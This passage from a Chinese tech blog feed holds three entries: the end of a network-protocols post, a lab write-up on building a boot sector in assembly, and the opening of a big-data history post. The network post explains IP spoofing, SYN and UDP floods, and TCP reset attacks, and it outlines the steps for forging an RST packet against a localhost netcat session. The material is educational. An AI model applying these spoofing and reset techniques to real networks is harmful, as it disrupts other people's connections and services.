procedure calls</a></p><p>定义了 RPC 的调用标准</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220318-rpc.jpg" alt=""></p><p>其中 RPC 和 HTTP 调用是没有经过中间件的，它们是端到端系统的直接数据交互HTTP 调用其实也可以看成是一种特殊的 RPC，只不过传统意义上的 RPC 是指长连接<a href="https://www.zhihu.com/search?q=%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A417707733%7D">数据交互</a>，而 HTTP 一般是指即用即走的短链接。</p><p>RPC 在我们熟知的各种中间件中都有它的身影。Nginx/Redis/MySQL/Dubbo/Hadoop/Spark/Tensorflow 等重量级开源产品都是在 RPC 技术的基础上构建出来的，我们这里说的 RPC 指的是广义的 RPC，也就是分布式系统的通信技术。</p><p>​</p><h1>安全</h1><h2 id="TCP-IP常见攻击">TCP/IP常见攻击</h2><h3 id="IP欺骗">IP欺骗</h3><blockquote><p>通过IP地址我们能知道什么？</p></blockquote><p>通过 IP 地址，我们就可以知道判断访问对象服务器的位置，通过这个 IP 地址就可以判断访问对象服务器的位置，从而将消息发送到服务器。一般发送者发出的消息首先经过子网的集线器，转发到最近的路由器，然后根据路由位置访问下一个路由器的位置，直到重点</p><blockquote><p>IP欺骗技术</p></blockquote><p>IP 欺骗技术就是<strong>伪造</strong>某台主机的 IP 地址的技术。通过IP 地址的伪装使得某台主机能够<strong>伪装</strong>另外的一台主机，而这台主机往往具有某种特权或者被另外的主机所信任。</p><p>假设现在有一个合法用户 <strong>(1.1.1.1)</strong> 已经同服务器建立正常的连接，攻击者构造攻击的 TCP 数据，伪装自己的 IP 为 <strong>1.1.1.1</strong>，并向服务器发送一个带有 RSI 位的 TCP 数据段。服务器接收到这样的数据后，认为从 <strong>1.1.1.1</strong> 发送的连接有错误，就会清空缓冲区中建立好的连接。</p><p>这时，如果合法用户 <strong>1.1.1.1</strong> 再发送合法数据，服务器就已经没有这样的连接了，该用户就必须从新开始建立连接。攻击时，伪造大量的IP地址，向目标发送 RST 数据，使服务器不对合法用户服务。虽然IP地址欺骗攻击有着相当难度，但我们应该清醒地意识到，这种攻击非常广泛，入侵往往从这种攻击开始。</p><h3 id="SYN-Flooding">SYN Flooding</h3><blockquote><p>SYN Flooding简介</p></blockquote><p>拒绝服务攻击（DDoS）从1970 年出现直到今天都依然在作祟，并给全球范围内的各大组织带来了不可估量的损失。<strong>SYN Flood</strong>是互联网上最经典的DDoS攻击方式之一，最早出现于 1999 年左右，雅虎是当时最著名的受害者。<strong>SYN Flood</strong>攻击利用了 <strong>TCP</strong> 三次握手的缺陷，能够以较小代价使目标服务器无法响应，且难以追查。</p><p><strong>SYN  flood</strong> 是一种常见的 <strong>DOS</strong>（denial of service拒绝服务）和 <strong>DDos</strong> (distributed denial of serivce 分布式拒绝服务）攻击方式。这是一种使用TCP协议缺陷，发送大量的<strong>伪造的 TCP 连接请求</strong>，使得被攻击方 CPU 或内存资源耗尽，最终导致被攻击方无法提供正常的服务。</p><blockquote><p>TCP SYN Flood攻击原理</p></blockquote><p><strong>TCP  SYN Flood</strong> 攻击利用的是 <strong>TCP</strong> 的三次握手（<strong>SYN -&gt; SYN/ACK -&gt; ACK</strong>），假设连接发起方是A，连接接受方是 B，即 B 在某个端口（<strong>Port</strong>）上监听A发出的连接请求，过程如下图所示，左边是A，右边是B。</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Ccs-network-protocol%5C640.png" alt="640"></p><p>A 首先发送 <strong>SYN</strong>（Synchronization）消息给 B，要求 B 做好接收数据的准备；B 收到后反馈 <strong>SYN-ACK</strong>（Synchronization-Acknowledgement） 消息给A，这个消息的目的有两个：</p><ul><li>向 A 确认已做好接收数据的准备，</li><li>同时要求 A 也做好接收数据的准备，此时 B 已向 A 确认好接收状态，并等待 A 的确认，连接处于<strong>半开状态（Half-Open）</strong>，顾名思义只开了一半；A 收到后再次发送 <strong>ACK</strong> (Acknowledgement) 消息给B，向 B 确认也做好了接收数据的准备，至此三次握手完成，「<strong>连接</strong>」就建立了，</li></ul><p>大家注意到没有，最关键的一点在于双方是否都按对方的要求进入了<strong>可以接收消息</strong>的状态。而这个状态的确认主要是双方将要使用的<strong>消息序号(<strong>SquenceNum)，<strong>TCP</strong> 为保证消息按发送顺序抵达接收方的上层应用，需要用</strong>消息序号</strong>来标记消息的发送先后顺序的。</p><p><strong>TCP</strong>是「<strong>双工</strong>」(Duplex)连接，同时支持双向通信，也就是双方同时可向对方发送消息，其中 <strong>SYN</strong> 和 <strong>SYN-ACK</strong> 消息开启了A→B的单向通信通道（B 获知了 A 的消息序号）；<strong>SYN-ACK</strong> 和 <strong>ACK</strong> 消息开启了B→A单向通信通道（A获知了B的消息序号）。</p><p>上面讨论的是双方在诚实守信，正常情况下的通信。</p><p>但实际情况是，网络可能不稳定会丢包，使握手消息不能抵达对方，也可能是对方故意不按规矩来，故意延迟或不发送握手确认消息。</p><p>假设  B 通过某 <strong>TCP</strong> 端口提供服务，B 在收到 A 的 <strong>SYN</strong> 消息时，积极的反馈了 <strong>SYN-ACK</strong> 消息，使连接进入<strong>半开状态</strong>，因为 B 不确定自己发给 A 的 <strong>SYN-ACK</strong> 消息或 A 反馈的 ACK 消息是否会丢在半路，所以会给每个待完成的半开连接都设一个<strong>Timer</strong>，如果超过时间还没有收到 A 的 <strong>ACK</strong> 消息，则重新发送一次 <strong>SYN-ACK</strong> 消息给A，直到重试超过一定次数时才会放弃。</p><p>B 为帮助 A 能顺利连接，需要<strong>分配内核资源</strong>维护半开连接，那么当 B 面临海量的连接 A 时，如上图所示，<strong>SYN Flood</strong> 攻击就形成了。攻击方 A 可以控制肉鸡向 B 发送大量 SYN 消息但不响应 ACK 消息，或者干脆伪造 SYN 消息中的 <strong>Source IP</strong>，使 B 反馈的 <strong>SYN-ACK</strong> 消息石沉大海，导致 B 被大量注定不能完成的半开连接占据，直到资源耗尽，停止响应正常的连接请求。</p><h3 id="UDP-Flooding">UDP Flooding</h3><p><strong>UDP</strong> 洪泛是也是一种拒绝服务攻击，将大量的用户数据报协议（<strong>UDP</strong>）数据包发送到目标服务器，目的是压倒该设备的处理和响应能力。防火墙保护目标服务器也可能因 <strong>UDP</strong> 泛滥而耗尽，从而导致对合法流量的拒绝服务。</p><blockquote><p>UDP Flood攻击如何工作？</p></blockquote><p><strong>UDP Flood</strong> 主要通过利用服务器响应发送到其中一个端口的 <strong>UDP</strong> 数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到 <strong>UDP</strong> 数据包时，会经过两个步骤：</p><ul><li>服务器首先检查是否正在运行正在侦听指定端口的请求的程序。</li><li>如果没有程序在该端口接收数据包，则服务器使用 <strong>ICMP</strong>（ping）数据包进行响应，以通知发送方目的地不可达。</li></ul><p>举个例子。假设今天要联系酒店的小蓝，酒店客服接到电话后先查看房间的列表来确保小蓝在客房内，随后转接给小蓝。</p><p>首先，接待员接收到呼叫者要求连接到特定房间的电话。接待员然后需要查看所有房间的清单，以确保客人在房间中可用，并愿意接听电话。碰巧的是，此时如果突然间所有的电话线同时亮起来，那么他们就会很快就变得不堪重负了。</p><p>当服务器接收到每个新的 <strong>UDP</strong> 数据包时，它将通过步骤来处理请求，并利用该过程中的服务器资源。发送 <strong>UDP</strong> 报文时，每个报文将包含源设备的 <strong>IP</strong> 地址。在这种类型的 <strong>DDoS</strong> 攻击期间，攻击者通常不会使用自己的真实 <strong>IP</strong> 地址，而是会欺骗 <strong>UDP</strong> 数据包的源 <strong>IP</strong> 地址，从而阻止攻击者的真实位置被暴露并潜在地饱和来自目标的响应数据包服务器。</p><p>由于目标服务器利用资源检查并响应每个接收到的 <strong>UDP</strong> 数据包的结果，当接收到大量 <strong>UDP</strong> 数据包时，目标的资源可能会迅速耗尽，导致对正常流量的拒绝服务。</p><p>![](.\cs-network-protocol\640 (1).png)</p><blockquote><p>如何缓解<strong>UDP</strong>洪水攻击？</p></blockquote><p>大多数操作系统部分限制了 <strong>ICMP</strong> 报文的响应速率，以中断需要 ICMP 响应的 <strong>DDoS</strong> 攻击。这种缓解的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果 <strong>UDP Flood</strong> 的容量足够高以使目标服务器的防火墙的状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。</p><h3 id="4-TCP-重置攻击">4 TCP 重置攻击</h3><p>在 <strong>TCP</strong> 重置攻击中，攻击者通过向通信的一方或双方发送伪造的消息，告诉它们立即断开连接，从而使通信双方连接中断。正常情况下，如果客户端收发现到达的报文段对于相关连接而言是不正确的，<strong>TCP</strong> 就会发送一个重置报文段，从而导致 <strong>TCP</strong> 连接的快速拆卸。</p><p><strong>TCP</strong> 重置攻击利用这一机制，通过向通信方发送伪造的重置报文段，欺骗通信双方提前关闭 TCP 连接。如果伪造的重置报文段完全逼真，接收者就会认为它有效，并关闭 <strong>TCP</strong> 连接，防止连接被用来进一步交换信息。服务端可以创建一个新的 <strong>TCP</strong> 连接来恢复通信，但仍然可能会被攻击者重置连接。万幸的是，攻击者需要一定的时间来组装和发送伪造的报文，所以一般情况下这种攻击只对长连接有杀伤力，对于短连接而言，你还没攻击呢，人家已经完成了信息交换。</p><p>从某种意义上来说，伪造 <strong>TCP</strong> 报文段是很容易的，因为 <strong>TCP/IP</strong> 都没有任何内置的方法来验证服务端的身份。有些特殊的 IP 扩展协议（例如 <code>IPSec</code>）确实可以验证身份，但并没有被广泛使用。客户端只能接收报文段，并在可能的情况下使用更高级别的协议（如 <code>TLS</code>）来验证服务端的身份。但这个方法对 <strong>TCP</strong> 重置包并不适用，因为 <strong>TCP</strong> 重置包是 <strong>TCP</strong> 协议本身的一部分，无法使用更高级别的协议进行验证。</p><h3 id="5-模拟攻击">5. 模拟攻击</h3><blockquote><p>以下实验是在 <code>OSX</code> 系统中完成的，其他系统请自行测试。</p></blockquote><p>现在来总结一下伪造一个 <strong>TCP</strong> 重置报文要做哪些事情：</p><ul><li>嗅探通信双方的交换信息。</li><li>截获一个 <code>ACK</code> 标志位置位 1 的报文段，并读取其 <code>ACK</code> 号。</li><li>伪造一个 TCP 重置报文段（<code>RST</code> 标志位置为 1），其序列号等于上面截获的报文的 <code>ACK</code> 号。这只是理想情况下的方案，假设信息交换的速度不是很快。大多数情况下为了增加成功率，可以连续发送序列号不同的重置报文。</li><li>将伪造的重置报文发送给通信的一方或双方，时其中断连接。</li></ul><p>为了实验简单，我们可以使用本地计算机通过 <code>localhost</code> 与自己通信，然后对自己进行 TCP 重置攻击。需要以下几个步骤：</p><ul><li>在两个终端之间建立一个 TCP 连接。</li><li>编写一个能嗅探通信双方数据的攻击程序。</li><li>修改攻击程序，伪造并发送重置报文。</li></ul><p>下面正式开始实验。</p><blockquote><p>建立 TCP 连接</p></blockquote><p>可以使用 netcat 工具来建立 TCP 连接，这个工很多操作系统都预装了。打开第一个终端窗口，运行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">$ nc -nvl 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会启动一个 TCP 服务，监听端口为 <code>8000</code>。接着再打开第二个终端窗口，运行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">$ nc 127.0.0.1 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该命令会尝试与上面的服务建立连接，在其中一个窗口输入一些字符，就会通过 TCP 连接发送给另一个窗口并打印出来。</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIyMDEzMTA2MQ==&amp;mid=2651155801&amp;idx=1&amp;sn=1e6d78eb10d17eed9b76d9a998dd4721&amp;chksm=8c2176c3bb56ffd58fcf0945b55f61da8276f33ef6e0ac76e65b5879d691d2421e57d53abc5e&amp;mpshare=1&amp;scene=23&amp;srcid=0401A7HxBrZ8LLjyjtiij0y6&amp;sharer_sharetime=1617272795419&amp;sharer_shareid=64abb8dbf61eddce88d292199cd11b73#rd">https://mp.weixin.qq.com/s?__biz=MzIyMDEzMTA2MQ==&amp;mid=2651155801&amp;idx=1&amp;sn=1e6d78eb10d17eed9b76d9a998dd4721&amp;chksm=8c2176c3bb56ffd58fcf0945b55f61da8276f33ef6e0ac76e65b5879d691d2421e57d53abc5e&amp;mpshare=1&amp;scene=23&amp;srcid=0401A7HxBrZ8LLjyjtiij0y6&amp;sharer_sharetime=1617272795419&amp;sharer_shareid=64abb8dbf61eddce88d292199cd11b73#rd</a></p><h1>问题和解答</h1><p><strong>可以通过路由表得到下一个路由器的 IP 地址，直接通过 IP 地址找就可以了，为什么还要通过本地的 MAC 地址呢？</strong></p><p>在网络包里，有源 IP 地址和目标 IP 地址、源 MAC 地址和目标 MAC 地址。从路由表中取得下一跳的 IP 地址后，应该把这个地址放在哪里呢？如果放在目标 IP 地址里面，谁知道最终的目标在哪里呢？所以要用 MAC 地址。</p><p>所谓的下一跳，看起来是 IP 地址，其实是要通过 ARP 得到 MAC 地址，将下一跳的 MAC 地址放在目标 MAC 地址里面。</p><p>​</p><p>​</p><p><strong>MAC 地址可以修改吗？</strong></p><p><strong>MAC地址</strong>（<code>Media Access Control</code>，介质访问控制），也叫硬件地址，长度是 48 比特（6 字节），由 16 进制的数字组成，分为前 24 位和后 24 位。</p><p>前 24 位叫作<strong>组织唯一标志符</strong>（<code>Organizationally Unique Identifier，OUI</code>），是由 IEEE 的注册管理机构给不同厂家分配的代码，用于区分不同的厂家。后 24 位是厂家自己分配的，称为<strong>扩展标识符</strong>。同一个厂家生产的网卡中 MAC 地址后 24 位是不同的。</p><p>MAC 本来设计为唯一性的，但是后来设备越来越多，而且还有虚拟化的设备和网卡，有很多工具可以修改，就很难保证不冲突了。但是至少应该保持一个局域网内是唯一的。</p><p>MAC 的设计，使得即便不能保证绝对唯一，但是能保证一个局域网内出现冲突的概率很小。这样，一台机器启动的时候，就能够在没有 IP 地址的情况下，先用 MAC 地址进行通信，获得 IP 地址。</p><p>好在 MAC 地址是工作在一个局域网中的，因而即便出现了冲突，网络工程师也能够在自己的范围内很快定位并解决这个问题。</p><p>​</p><p>​</p><p><strong>TCP 重试有没有可能导致重复下单？</strong></p><p>不会的。因为 TCP 层收到了重复包之后，TCP 层自己会进行去重，发给应用层、HTTP 层。还是一个唯一的下单请求，所以不会重复下单。</p><p>那什么时候会导致重复下单呢？因为网络原因或者服务端错误，导致 TCP 连接断了，这样会重新发送应用层的请求，也即 HTTP 的请求会重新发送一遍。</p><p>如果服务端设计的是无状态的，它记不住上一次已经发送了一次请求。如果处理不好，就会导致重复下单，这就需要服务端除了实现无状态，还需要根据传过来的订单号实现幂等，同一个订单只处理一次。</p><p>还会有的现象是请求被黑客拦截，发送多次，这在 HTTPS 层可以有很多种机制，例如通过 Timestamp 和 Nonce 随机数联合起来，然后做一个不可逆的签名来保证。</p><h1>参考</h1><ul><li><a href="https://notebyte.top/net_communication/net_protocol.html#%E5%9F%BA%E7%A1%80%E7%BD%91%E7%BB%9C">网络协议</a></li><li>Web协议详解与抓包实战</li><li><a href="https://www.ruanyifeng.com/blog/2011/09/restful.html">理解 RESTful 架构</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 网络协议 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> 微服务 </tag>
            
            <tag> 容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开发操作系统实验</title>
      <link href="2021/01/28/hello-os/"/>
      <url>2021/01/28/hello-os/</url>
      
        <content type="html"><![CDATA[<h2 id="01-环境的配置与搭建">01 | 环境的配置与搭建</h2><ul><li><p>工具：<code>VirtualBox</code>、<code>Nasm</code> （汇编）</p></li><li><p>目标：通过硬盘启动自己的操作系统</p></li></ul><blockquote><p>实验：完成第一个引导扇区启动程序</p></blockquote><ol><li><p>生成虚拟磁盘：将虚拟文件当做硬盘挂载</p><p><code>diskpart</code>命令：制作自己的虚拟磁盘</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210918-diskpart.png" alt="执行diskpart命令得到vhd"></p></li><li><p>编写汇编代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">org 07c00h ; 指定下面的指令从7c00h处开始mov ax,csmov ds,ax  ; 使数据段与代码段在同一个段mov es,ax  ; 使附加段与代码段在同一个段call Disp  ; 调用子程序显示字符串信息jmp $      ; 死循环Disp:mov ax,BootMsgmov bp,axmov cx,16; ah=13h 10号中断13h号功能：在Teletype模式下显示字符串mov ax,01301hmov bx,000chmov dl,0int 10h ; 调用10号中断BootMsg: db "Hello, OS World!"times 510 - ($-$$)db 0 ; 填充0 dw 0xaa55  ; 魔数，硬盘主引导分区可引导标识<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210219-203710096.png" alt=""></p><blockquote><p>此代码段是存于磁盘引导扇区的系统引导程序</p><p>若存于硬盘第一个扇区，则这段代码称为硬盘主引导记录</p></blockquote></li><li><p>使用<code>Nasm</code>进行编译</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220213-nasm1.png" alt=""></p></li><li><p>使用<code>dd</code>工具将<code>.bin</code>文件写入磁盘</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220213-dd1.png" alt=""></p></li><li><p>在虚拟机中运行</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220213-vm-run.png" alt=""></p></li></ol><p>​</p><h2 id="02-操作系统基础">02 | 操作系统基础</h2><ul><li><p>CPU 组成</p><ul><li>寄存器是 CPU 内部的信息存储单元，Intel 8086 CPU 有14个寄存器</li></ul></li><li><p>代码段和数据段（逻辑概念，在内存中）</p></li><li><p>分段机制：通过改变CS寄存器的数字去改变想要推进的程序，程序的加载可以通过一个管理程序进行调度</p></li><li><p>操作系统要做什么？</p><ul><li><p>需要让机器做事情</p></li><li><p>开机后接管CPU的控制权</p></li><li><p>需要接收和发送消息给硬件</p></li><li><p>需要管理和调度应用</p></li><li><p>需要让用户可以参与管理</p></li></ul><blockquote><p><em>A group of program that controls the execution of application programs. Acts as an interface between applications and hardware</em></p></blockquote></li></ul><h3 id="计算机启动过程">计算机启动过程</h3><ul><li><p>开机后OS需要接管CPU的控制权，但在OS运行之前是BIOS在管理计算机</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-os-start.jpg" alt=""></p></li><li><p>实模式：CPU复位或加电的时候以实模式启动，处理器以实模式工作</p><ul><li>在实模式下，内存寻址方式和8086相同，由基地址加上偏移地址形成20位的物理地址，最大寻址空间1MB，最大分段64KB</li><li>在实模式下，所有的段都是可以读、写和可执行的</li></ul></li><li><p><strong>BIOS 初始化</strong></p></li><li><p><strong>加电自检</strong>（POST，<code>power on self test</code>）：固化在主板的BIOS，检查硬件的好坏，打开电源，BIOS开始自检，然后出发19号中断，在处理19号中断时，BIOS检测电脑是否具有软盘、硬盘或是固定磁盘，如果有任何可以使用的磁盘，就把磁盘的第一个扇区（512B）加载到内存</p></li><li><p><strong>BIOS加载OS</strong></p><ul><li>MBR 将自己复制到内存地址 <code>0000:0600</code> 处，然后开始执行</li><li>MBR 位于硬盘的 0 磁道 0 柱面第1扇区，该磁道均为隐含扇区，普通的磁盘访问命令无法访问，一共512个字节</li><li>在主分区表中搜索标志为活动的分区，如果发现没有活动分区或有不止一个活动分区，则转停止</li><li>将活动分区的第一个扇区读入内存地址 <code>0000:7c00</code> 处</li><li>检查 (WORD) <code>0000:7dfe</code> 是否等于 <code>0xaa55</code>，若不等于则显示 <em>“Missing Operating System”</em> 然后停止</li><li>跳转到 <code>0000:7c00</code> 处继续执行特定系统的启动程序</li></ul></li></ul><p>​</p><h2 id="03-控制计算机屏幕">03 | 控制计算机屏幕</h2><ul><li><strong>显示的原理</strong>：屏幕上的内容=显存中的数据，显卡控制的最小单位是像素，一个像素对应屏幕上一个点</li><li>现在显卡几乎都支持 VESA 制定的 VBE 标准，这种标准下有两种工作模式：文本模式和图形模式</li></ul><h3 id="文本模式">文本模式</h3><ul><li><p>专门用来显示字符的工作方式</p></li><li><p>PC 在加电自检后系统会初始化为 80 × 25 的文本模式</p></li><li><p>显存的地址空间 <code>A0000h-BFFFFh</code> 共128K空间，其中 <code>B8000h-BFFFFh</code> 共32K的空间是 80 × 25 彩色字符模式显示缓冲区，显示缓冲区分为8页，显示器可以显示任意一页的内容，通常情况下 B8000H-B8F9F 中的内容将出现在显示器上</p></li><li><p>显示器可以显示25行，每行80个字符，每两个字节对应一个字符，其中一个字节是字符的 ASCII 码，另一个字节为字符的属性字节，每个字符可以有256种属性（背景色、前景色、闪烁、高亮等组合信息）</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-rgb.png" style="zoom: 67%;"></li></ul><h3 id="实验">实验</h3><ol><li><p>编写汇编代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov ax,0xb800 ;指向文本模式的显示缓冲区mov es,axmov byte [es:0x00],'I'  ;显示内容 byte [es:]用于寻址mov byte [es:0x01],0x07 ;字符属性mov byte [es:0x02],'L'mov byte [es:0x03],0x06times 510 - ($-$$)db 0dw 0xaa55<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>$</code>当前位置</p><p><code>$$</code>程序起始位置</p></blockquote></li><li><p>编译</p></li><li><p>写入磁盘</p></li></ol><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210219-dd.png" alt=""></p><ol start="4"><li>在虚拟机中运行</li></ol><h2 id="04-从硬盘引导">04 | 从硬盘引导</h2><ul><li><p>目前硬盘一般分为 <strong>HDD</strong>（Hard Disk Drive，传统的磁碟型机械硬盘）和 <strong>SSD</strong>（Solid State Disk，固态硬盘）</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-drive.jpg" style="zoom:80%;"><ul><li><p><strong>HDD</strong>：Hard Disk Drive，即传统机械硬盘</p><ul><li>由盘片、磁头、转轴、控制电机等部分组成，工作时盘片转动，磁头定位在盘片的指定位置上进行读写操作</li><li>优势在于容量大、成本低，寿命也相对较长，适合进行大容量的数据写入</li><li>缺点也非常明显，比如体积重量大、发热量大、速度慢、不抗震、噪音大等等</li></ul></li><li><p><strong>SSD</strong>：Solid-State Drive（固态硬盘）</p><ul><li>一般使用 <strong>NAND 闪存</strong>制成</li><li>由于不存在机械部件，所以稳定性、噪音、发热量、抗震性都要比传统机械硬盘更好，读写速度也更快，但是价格也更高</li></ul></li></ul></li><li><p><strong>磁盘结构</strong></p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-hdd.jpg" style="zoom: 80%;"><ul><li>磁道<code>Track</code>：当磁盘旋转时，磁头若保持在一个位置上，则每个磁头都会在磁盘表面划出一个圆形轨迹，这些圆形轨迹就叫做磁道</li><li>半经大小相同的磁道所组成的柱形叫柱面</li><li>柱面<code>Cylinder</code>：由不同盘片的半经大小相同的磁道所组成的圆柱面</li><li>扇区<code>Sector</code>：磁盘上的每个磁道被等分为若干个弧段，这些弧段便是硬盘的扇区<ul><li><p>硬盘的第一个扇区，叫做引导扇区</p></li><li><p>磁盘又称<strong>块设备</strong>，因为存取不是字节流形式的，而是以块为单位，每个块为一个扇区</p></li><li><p>磁头：主要作用是将存储在硬盘盘片上的磁信息转化为电信号向外传输</p><ul><li>工作原理是利用特殊材料的电阻值会随着磁场变化的原理来读写盘片上的数据</li><li>磁头的好坏在很大程度上决定着硬盘盘片的存储密度</li></ul></li><li><p>盘片：硬盘中承载数据存储的介质</p><ul><li>硬盘是由多个盘片叠加在一起，互相之间由垫圈隔开</li></ul></li></ul></li></ul></li><li><p>编址</p><ul><li><p>编址时优先考虑磁盘旋转，而后再考虑磁头移动（以柱面优先的形式编址）</p></li><li><p><code>CHS</code></p><ul><li>CHS寻址模式使用柱面号+磁头号+扇区号来编址（C，H，S）</li><li>地址（块号）=<code>C × (nHeads × nSectors) + H × nSectors + S</code></li></ul></li><li><p><code>LBA</code></p><ul><li>扩大了寻址范围</li><li>LBA：用 28 bit来描述一个扇区</li></ul></li><li><p>以上就是从存储设备（硬盘）到文件系统的<strong>第一层抽象</strong>，即抽象出块设备的块号（块地址）</p></li></ul></li><li><p>CPU不会直接和硬盘打交道，而是和IO接口和硬盘控制的主寄存器打交道</p><ul><li>Data寄存器、Error寄存器、Device寄存器（给出硬盘状态）…</li></ul></li><li><p>读取数据步骤</p><p>1）先选择通道，往该通道上的<code>sector count</code>寄存器写入待操作的扇区数</p><p>2）往该通道的3个LBA寄存器写入扇区的起始地址</p><p>3）往<code>device</code>寄存器写入LBA的24-27位，设为LBA，并设置<code>dev</code>表明是从盘还是主盘</p><p>4）往<code>command</code>寄存器写命令</p><p>5）检查status寄存器</p><p>6）读入数据</p></li></ul><blockquote><p>实验：将第二个扇区里面的内容加载进入内存</p></blockquote><ol><li>编写汇编代码</li></ol><p><code>mbr.asm</code></p><p><code>loader.asm</code></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220214-loader.png" alt=""></p><ol start="2"><li><p>使用<code>Nasm</code>进行编译</p></li><li><p>写入磁盘</p></li></ol><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220214-dd.png" alt=""></p><ol start="4"><li>在虚拟机中运行</li></ol><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220214-display.png" alt=""></p><blockquote><p>突破了512字节！</p></blockquote><p>​</p><ul><li>参考：<ul><li><a href="https://www.zhihu.com/question/335397213/answer/752283935">机械硬盘如何编址</a></li><li></li></ul></li></ul><h2 id="5-保护模式入门">5. 保护模式入门</h2><ol><li><p>在80286以前，CPU只有实模式，最多能够访问1M的内存空间。</p><ul><li>可以任意访问内存，操作系统和用户程序实际上做不到内存的隔离</li><li>用户程序访问的逻辑地址实际上就是物理地址</li><li>用户程序可以随意修改段基址</li></ul></li><li><p>随着CPU的发展，CPU的地址线变为32根，至少可以访问到4G的内存空间。实模式下的内存地址计算方式就已经不再适合了。所以就引入了保护模式，实现更大空间的，更灵活也<strong>更安全</strong>的内存访问。</p><ul><li>为了保证向下兼容，80286及以后的CPU首先进入实模式，然后通过切换机制再进入到保护模式。</li><li>保护模式下把关于内存段的限制信息放在一个叫做<strong>全局描述符表(GDT)<strong>的结构里。全局描述符表中含有一个个表项，每一个表项称为</strong>段描述符。</strong></li></ul></li></ol><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20220214-32-os.png" alt="保护模式下被扩展成32位寄存器"></p><ol start="3"><li><strong>全局描述符表位于内存中</strong>，CPU用专门的寄存器指向它。这个专门的寄存器是<strong>GDTR</strong>（一个48位的寄存器）,专门用来存储 GDT 的内存地址及大小。</li></ol><p>内核：内核是连接操作系统和硬件和软件的桥梁，它掌控着计算机中的一切资源。</p><p>​</p><p>​</p><blockquote><p>未完待续</p></blockquote><h2 id="参考">参考</h2><ul><li><p>内存布局</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-memory-distribution.png" style="zoom: 67%;"></li><li><p><a href="https://437436999.github.io/2020/03/15/%E6%98%BE%E5%8D%A1%E6%96%87%E6%9C%AC%E6%A8%A1%E5%BC%8F/">显卡文本模式</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据入门</title>
      <link href="2021/01/27/big-data-basic/"/>
      <url>2021/01/27/big-data-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言-2">0. 前言</h2><h3 id="大数据技术发展史">大数据技术发展史</h3><blockquote><p>论文奠定技术发展基石<br>业务催生技术不断突破<br>效率倒逼技术迭代更新</p></blockquote><p>  今天常说的大数据技术起源于 <em>Google</em> 在 2004 年前后发表的三篇论文，也就是我们经常听到的“三驾马车”，分别是<strong>分布式文件系统</strong> <code>GFS</code>、<strong>大数据分布式计算框架</strong> <code>MapReduce</code> 和 <strong>NoSQL 数据库系统</strong> <code>BigTable</code></p><p>  搜索引擎主要做网页抓取和索引构建两件事，在这个过程中有大量数据需要存储和计算。这“三驾马车”其实就是用来解决这个问题的。那时大多数公司的关注点还聚焦在单机上，在思考如何提升单机的性能，寻找更贵更好的服务器。而 <em>Google</em> 的思路是部署一个大规模的服务器集群，通过分布式的方式将海量数据存储在这个集群上，然后利用集群上的所有机器进行数据计算。</p><p>  当时的天才程序员，也是 Lucene 开源项目的创始人 <em>Doug Cutting</em> 正在开发开源搜索引擎 Nutch，他阅读了论文后根据论文原理初步实现了类似的功能。</p><br><p>  2006 年，<em>Doug Cutting</em> 将这些大数据相关的功能从 Nutch 中分离了出来，然后启动了一个独立的项目专门开发维护大数据技术，这就是后来的<code>Hadoop</code>，主要包括 Hadoop 分布式文件系统 HDFS 和大数据计算引擎 MapReduce 。Hadoop 发布之后，<em>Yahoo</em> 很快就用了起来。</p><p>  2008 年，Hadoop 正式成为 Apache 的顶级项目，后来 <em>Doug Cutting</em> 本人也成为了 Apache 基金会的主席。自此，Hadoop 作为软件开发领域的一颗明星冉冉升起。同年，商业公司 <em>Cloudera</em> 成立，Hadoop 得到进一步的商业支持。</p><p>  这时 Yahoo 的一些人觉得用 MapReduce 进行大数据编程太麻烦，于是便开发了脚本语言 Pig 